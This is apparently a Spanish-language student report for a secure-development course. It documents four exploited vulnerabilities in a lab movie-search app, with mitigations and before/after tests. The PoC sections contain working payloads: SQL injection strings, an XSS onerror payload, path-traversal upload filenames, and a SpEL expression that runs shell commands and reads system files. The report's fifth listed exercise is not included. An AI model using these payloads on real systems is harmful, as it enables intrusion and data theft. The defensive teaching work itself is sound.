# Práctico 2 — Mitigación de Vulnerabilidades de CWE

Repositorio base: https://github.com/ucudal/2026-Desarrollo-Seguro
Rama de mitigaciones: `practico-2` (la rama `main` no se modifica).

| # | Ejercicio | Vulnerabilidad | CWE |
|---|-----------|----------------|-----|
| 1 | CineBuscador (Flask) | Inyección SQL | CWE-89 |
| 2 | CineBuscador + edición (Flask) | Cross-Site Scripting almacenado | CWE-79 |
| 3 | CineBuscador afiches (Spring Boot) | Carga de archivos sin restricción + Path Traversal | CWE-434 / CWE-22 |
| 4 | CineBuscador funciones (Spring Boot) | Server-Side Template Injection (SpEL) → RCE | CWE-94 / CWE-917 |
| 5 | Login CineBuscador (Spring Boot) | Almacenamiento inseguro de credenciales | CWE-312 / CWE-321 / CWE-327 |

Cada sección incluye: descripción del hallazgo, PoC paso a paso, la mitigación aplicada y la verificación (antes/después).

---

## Ejercicio 1 — Inyección SQL (CWE-89)

### 1.1 Hallazgo

Archivo: `Ejercicio1/app.py`, función `buscar_funciones()`.

El SQL se arma por interpolación de strings con los parámetros de la request:

```python
sql = f"...WHERE peliculas.nombre LIKE '%{query}%' " \
      f"ORDER BY {'peliculas.nombre' if sort_by == 'nombre' else 'funciones.fecha_hora'} " \
      f"{sort_dir}"
return db.execute(sql).fetchall()
```

Puntos de inyección:

- **`buscar`** (`query`): se concatena dentro de `LIKE '%...%'`. Permite cerrar la
  comilla y añadir `UNION SELECT ...` para leer cualquier tabla/metadato de la base.
- **`sentido`** (`sort_dir`): se concatena crudo al final del `ORDER BY`. Permite
  inyección en la cláusula `ORDER BY` (oráculo booleano / time-based).

`sqlite3.Connection.execute()` ejecuta una sola sentencia (no hay *stacked queries*),
pero `UNION SELECT` y la inyección en `ORDER BY` son suficientes para exfiltrar datos.

### 1.2 PoC

Requisitos: `cd Ejercicio1 && python init_db.py && python app.py`
(app en `http://127.0.0.1:5000`; en macOS el puerto 5000 lo ocupa AirPlay: usar
otro puerto, p. ej. `flask --app app run -p 5051`).

**PoC A — Exfiltrar toda la tabla `peliculas` con UNION**

Ingresar en el buscador (parámetro `buscar`):

```
zzz%' UNION SELECT group_concat(nombre||' / '||director,' | '), '', 1 FROM peliculas -- 
```

Petición equivalente:

```
GET /?buscar=zzz%25'%20UNION%20SELECT%20group_concat(nombre||'%20/%20'||director,'%20|%20'),%20'',%201%20FROM%20peliculas%20--%20
```

SQL resultante:

```sql
... WHERE peliculas.nombre LIKE '%zzz%' UNION SELECT group_concat(nombre||' / '||director,' | '), '', 1 FROM peliculas -- %' ORDER BY ...
```

Resultado: la primera columna de la tabla HTML muestra todos los directores:
`Dune: Parte Dos / Denis Villeneuve | Oppenheimer / Christopher Nolan | ...`

**PoC B — Enumerar el esquema (`sqlite_master`)**

```
zzz%' UNION SELECT name, sql, 1 FROM sqlite_master WHERE type='table' -- 
```

Resultado: `funciones`, `peliculas`, `sqlite_sequence` (más su DDL en la 2ª columna).
Con `sqlite_version()` se obtiene además la versión del motor (`3.50.4`).

**PoC C — Inyección en `ORDER BY` vía `sentido` (oráculo time-based)**

```
GET /?buscar=a&sentido=ASC, CASE WHEN (SELECT COUNT(*) FROM peliculas)=10
       THEN (SELECT count(*) FROM peliculas t1,peliculas t2,peliculas t3,
             peliculas t4,peliculas t5,peliculas t6,peliculas t7)
       ELSE 1 END
```

Con la condición verdadera el producto cartesiano dispara ~90 ms de latencia;
con `=999` (falsa) responde en ~1 ms. Es un oráculo booleano para extraer datos
bit a bit sin ver la salida.

### 1.3 Mitigación

- El término de búsqueda se pasa como **parámetro ligado** (`?`), nunca concatenado;
  el patrón `%...%` se arma sobre el valor del bind, no sobre el texto SQL.
- `ordenar_por` y `sentido` **no se interpolan**: se usan solo como clave para elegir
  un fragmento fijo desde una *allowlist* (`_COLUMNAS_ORDEN` y `'ASC'/'DESC'`).
  Cualquier valor fuera de la lista cae al valor por defecto.

```python
_COLUMNAS_ORDEN = {'nombre': 'peliculas.nombre', 'fecha': 'funciones.fecha_hora'}

def buscar_funciones(query, sort_by='nombre', sort_dir='ASC'):
    db = get_db()
    orden_columna = _COLUMNAS_ORDEN.get(sort_by, 'peliculas.nombre')
    orden_sentido = 'DESC' if str(sort_dir).upper() == 'DESC' else 'ASC'
    sql = (
        "SELECT peliculas.nombre as pelicula, funciones.fecha_hora, "
        "(funciones.asientos_totales - funciones.asientos_ocupados) as disponibles "
        "FROM funciones "
        "JOIN peliculas ON funciones.pelicula_id = peliculas.id "
        "WHERE peliculas.nombre LIKE ? "
        f"ORDER BY {orden_columna} {orden_sentido}"
    )
    return db.execute(sql, (f"%{query}%",)).fetchall()
```

### 1.4 Verificación

| Caso | Antes | Después |
|------|-------|---------|
| Búsqueda normal `buscar=Dune` | OK | OK (sin cambios) |
| Orden `nombre`/`fecha`, `ASC`/`DESC` | OK | OK (sin cambios) |
| PoC A (UNION directores) | Exfiltra la tabla | "No se encontraron funciones" (se busca literal) |
| PoC B (`sqlite_master`) | Lista tablas y DDL | "No se encontraron funciones" |
| PoC C (`sentido` time-based) | ~90 ms vs ~1 ms (oráculo) | ~1 ms constante, sin oráculo |
| `buscar=O'Brien` (comilla literal) | 500 / error SQL | HTTP 200, resultado vacío correcto |

Sin errores `OperationalError` en el log tras el fix.

---

## Ejercicio 2 — Cross-Site Scripting almacenado (CWE-79)

### 2.1 Hallazgo

Archivo: `Ejercicio2/templates/edit.html`, bloque "Descripción actual":

```jinja
<div class="prev-descripcion">
    <strong>Descripción actual:</strong><br>
    {{ pelicula['descripcion'] | safe }}
</div>
```

El filtro `| safe` desactiva el autoescape de Jinja2 para el campo `descripcion`.
Ese campo lo controla el usuario: se guarda **sin sanitizar** en `edit_post()`
(`Ejercicio2/app.py`) mediante un `UPDATE ... SET descripcion=?`. Cualquier
persona que edite una película puede almacenar HTML/JS que se ejecutará en el
navegador de quien luego abra la pantalla de edición de esa película
(XSS **almacenado / persistente**).

El resto de los puntos donde se muestra `descripcion` (tabla de resultados en
`index.html`, `<textarea>` y `value="..."` en `edit.html`) **sí** pasan por el
autoescape de Jinja2 y no son explotables.

### 2.2 PoC

Requisitos: `cd Ejercicio2 && python init_db.py && python app.py`.

1. **Inyección (atacante).** Enviar el formulario de edición de la película `id=1`
   con una descripción maliciosa:

   ```
   POST /edit/1
   Content-Type: application/x-www-form-urlencoded

   nombre=Dune&genero=SciFi&director=DV&descripcion=<img src=x onerror=alert(document.domain)><script>document.title="PWNED"</script>
   ```

   (equivalente por UI: abrir `http://127.0.0.1:5000/edit/1`, pegar el payload en
   el campo *Descripción* y "Guardar cambios"). Responde `302` → `/`.

2. **Ejecución (víctima).** La víctima abre `http://127.0.0.1:5000/edit/1`.
   El HTML servido contiene, sin escapar:

   ```html
   <div class="prev-descripcion">
       <strong>Descripción actual:</strong><br>
       <img src=x onerror=alert(document.domain)><script>document.title="PWNED"</script>
   </div>
   ```

   El `onerror` del `<img>` dispara el JS (el `<script>` inyectado post-carga no
   ejecuta por spec, pero el `onerror` sí): se ejecuta código arbitrario en el
   contexto de la aplicación (robo de sesión/cookies, acciones en nombre del
   usuario, etc.).

### 2.3 Mitigación

`Ejercicio2/templates/edit.html`: se **elimina el filtro `| safe`**. La descripción
es texto plano; con el autoescape de Jinja2, `<`, `>`, `"`, `&` se convierten en
entidades y el contenido se muestra como texto, nunca como marcado.

```jinja
<div class="prev-descripcion">
    <strong>Descripción actual:</strong><br>
    {{ pelicula['descripcion'] }}
</div>
```

Hallazgo secundario: `Ejercicio2/app.py` tenía el **mismo patrón de SQLi que el
Ejercicio 1** en `buscar_funciones()`. Se aplicó la misma mitigación (parámetro
ligado `?` + allowlist de `ORDER BY`).

Recomendación adicional (no requerida para cerrar el hallazgo): cabecera
`Content-Security-Policy` restrictiva como defensa en profundidad. No se
implementó aquí para no romper los manejadores inline (`onchange=...`) de las
plantillas del ejercicio.

### 2.4 Verificación

| Caso | Antes | Después |
|------|-------|---------|
| Payload en `descripcion`, abrir `/edit/1` | Se renderiza `<img onerror>` → JS ejecuta | `&lt;img src=x onerror=...&gt;` como texto, inerte |
| `<textarea>` / tabla de resultados | Ya escapado | Sin cambios, escapado |
| Edición y guardado normal de una película | OK | OK |
| PoC UNION SQLi (hallazgo secundario) | Exfiltra datos | "No se encontraron funciones" |
| Búsqueda normal | OK | OK |

---

## Ejercicio 3 — Carga de archivos sin restricción + Path Traversal (CWE-434 / CWE-22)

### 3.1 Hallazgo

Archivo: `Ejercicio3/src/main/java/com/cinebuscador/controller/PeliculaController.java`.

```java
String filename = archivo.getOriginalFilename();
Path uploadPath = Paths.get(uploadDir);
...
Files.copy(archivo.getInputStream(), uploadPath.resolve(filename));
pelicula.setAfichePath(filename);
```

Problemas:

1. **Sin validación de tipo/contenido (CWE-434).** Se acepta cualquier archivo
   (`accept="*/*"` en el form y cero chequeos en el servidor). `serveFile()`
   luego lo devuelve con `Content-Disposition: inline` y un `Content-Type`
   **adivinado por extensión**. Subiendo `poster.html` se obtiene un documento
   `text/html` servido *inline* desde el mismo origen de la app → **XSS
   almacenado** (y con SVG, JS embebido, etc.).
2. **Path Traversal en la escritura (CWE-22).** `getOriginalFilename()` es
   controlado por el cliente y se pasa tal cual a `resolve()`. Un `filename` del
   multipart con `../../../..` escribe el archivo **fuera** de `uploadDir`
   (escritura arbitraria de archivos).
3. **`serveFile()` sin contención.** `Paths.get(uploadDir).resolve(filename).normalize()`
   no verifica que el resultado siga dentro de `uploadDir`. Hoy Tomcat
   (`StrictHttpFirewall`) bloquea `../` y `%2f` en la URL, pero el método queda
   como bug latente si esa protección cambia.
4. Sin límite de tamaño explícito.

### 3.2 PoC

Requisitos: `cd Ejercicio3 && mvn spring-boot:run` (o `docker compose up`),
app en `http://127.0.0.1:8080`.

**PoC 1 — Subir HTML como "afiche" → XSS almacenado**

```bash
printf '<html><body><script>alert(document.domain)</script></body></html>' > xss.html
curl -X POST http://127.0.0.1:8080/upload/1 \
     -F 'afiche=@xss.html;type=image/png;filename=xss.html'
curl -i http://127.0.0.1:8080/uploads/xss.html
```

Respuesta observada (antes del fix):

```
HTTP/1.1 200
Content-Type: text/html
Content-Disposition: inline; filename="xss.html"

<html><body><script>alert(document.domain)</script></body></html>
```

El navegador ejecuta el `<script>` en el origen de la aplicación.

**PoC 2 — Path Traversal en la escritura**

```bash
curl -X POST http://127.0.0.1:8080/upload/1 \
     -F 'afiche=@cualquier.png;filename=../../../../../../tmp/ej3_PWNED_write.txt'
ls -l /tmp/ej3_PWNED_write.txt      # <-- el archivo aparece FUERA de uploadDir
```

### 3.3 Mitigación

`PeliculaController.java`:

- **Nombre generado en el servidor**: `UUID.randomUUID() + "." + ext`. El nombre
  del cliente se ignora por completo → no hay traversal en la escritura.
- **Allowlist por contenido real**: se decodifica el archivo con `ImageIO`
  (`getImageReaders` + `reader.read(0)`). Solo se acepta si el **formato real**
  es `JPEG/PNG/GIF/BMP`. Esto rechaza HTML, SVG, JS, binarios y poliglotas,
  independientemente de la extensión y del `Content-Type` que mande el cliente.
- **Límite de tamaño**: 2 MB en código + `spring.servlet.multipart.max-file-size=2MB`
  en `application.properties`.
- **`serveFile()` endurecido**: rechaza nombres con `/`, `\` o `..`; solo sirve
  extensiones de imagen conocidas con un `Content-Type` **fijo** (no adivinado);
  verifica `filePath.startsWith(base)` (contención dentro de `uploadDir`); agrega
  `X-Content-Type-Options: nosniff`.

### 3.4 Verificación

| Caso | Antes | Después |
|------|-------|---------|
| `xss.html` subido como `poster.png` | 200 `text/html` inline → XSS | POST redirige con error; `GET /uploads/poster.png` → 404 |
| `xss.svg` con `<script>`/`onload` | Se serviría | Rechazado (no es imagen decodificable) |
| `filename=../../../../tmp/ej3_PWNED_write.txt` | Archivo escrito fuera de `uploadDir` | Nombre ignorado; nada fuera de `uploadDir` |
| PNG válido (`whatever.php.png`) | OK, nombre del cliente | OK, guardado como `<uuid>.png`, servido `image/png` + `nosniff` |
| `GET /uploads/..%2f..%2fapplication.properties` | (Tomcat ya devolvía 400) | 400/404, además con contención propia |

---

## Ejercicio 4 — Server-Side Template Injection / SpEL Injection → RCE (CWE-94 / CWE-917)

### 4.1 Hallazgo

Archivo: `Ejercicio4/src/main/java/com/cinebuscador/config/SpelEvaluator.java`.

```java
ExpressionParser parser = new SpelExpressionParser();
EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build(); // <- se crea y NO se usa
StandardEvaluationContext standardContext = new StandardEvaluationContext();
standardContext.setVariable("system", System.class);
standardContext.setVariable("runtime", Runtime.class);
var expr = parser.parseExpression(expression);         // 'expression' = parametro ?buscar
Object result = expr.getValue(standardContext);        // evaluacion con contexto de PLENO poder
```

`FuncionController.search()` pasa el parámetro `buscar` (controlado por el usuario)
directamente a `spelEval.evaluate()`. Se **parsea y evalúa como expresión SpEL**
con un `StandardEvaluationContext`, que permite invocar cualquier tipo/método de
Java (`T(...)`, constructores, reflexión). El `SimpleEvaluationContext` seguro se
instancia pero nunca se usa. Resultado: **ejecución remota de código**.

### 4.2 PoC

Requisitos: `cd Ejercicio4 && mvn spring-boot:run` (o `docker compose up`),
app en `http://127.0.0.1:8080`.

**PoC 1 — RCE (ejecutar comandos del SO)**

```
GET /?buscar=T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id > /tmp/ej4_rce_proof.txt'})
```

`curl`:

```bash
curl -G http://127.0.0.1:8080/ \
  --data-urlencode "buscar=T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id > /tmp/ej4_rce_proof.txt'})"
cat /tmp/ej4_rce_proof.txt
```

Salida observada (antes del fix): el mensaje de la página muestra
`Process[pid=..., exitValue="not exited"]` y el archivo `/tmp/ej4_rce_proof.txt`
queda creado por el proceso del servidor con el resultado real de `id`
(`uid=501(bruno) gid=20(staff) ...`).

**PoC 2 — Lectura de archivos arbitrarios**

```
GET /?buscar=new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/hostname')))
```

El contenido del archivo aparece reflejado en el mensaje "Resultados buscando por: ...".

### 4.3 Mitigación

- Se **elimina por completo** la evaluación de expresiones: `SpelEvaluator.java`
  se borra y se quita la dependencia directa `spring-expression` del `pom.xml`.
- `FuncionController.search()` usa el término de búsqueda como **dato literal**:
  `String.contains()` insensible a mayúsculas sobre `nombre_funcion`. La entrada
  del usuario nunca se interpreta como expresión, plantilla ni código.
- Se actualiza el texto de `index.html` (ya no describe una vulnerabilidad SSTI).
  La salida sigue pasando por el autoescape de Thymeleaf.

```java
String termino = buscar.trim().toLowerCase();
List<Funcion> resultados = funcionRepo.findAll().stream()
    .filter(f -> f.getNombreFuncion() != null &&
                 f.getNombreFuncion().toLowerCase().contains(termino))
    .collect(Collectors.toList());
```

### 4.4 Verificación

| Caso | Antes | Después |
|------|-------|---------|
| `buscar=Inception` / `Matrix` | Error/0 resultados (no era buscador real) | Filtra las funciones correctas |
| PoC 1 `T(java.lang.Runtime)...exec(...)` | Ejecuta el comando; crea `/tmp/ej4_rce_proof.txt` | "No se encontraron coincidencias."; no se ejecuta nada |
| PoC 2 `Files.readAllBytes('/etc/hostname')` | Devuelve el contenido del archivo | Tratado como texto literal, sin coincidencias |
| `buscar=<b>x</b>&y` | — | Se muestra escapado (`&lt;b&gt;`), sin XSS |
| Log del servidor | `Process[...]` / SpEL | Sin `SpelEvaluationException` ni ejecución |

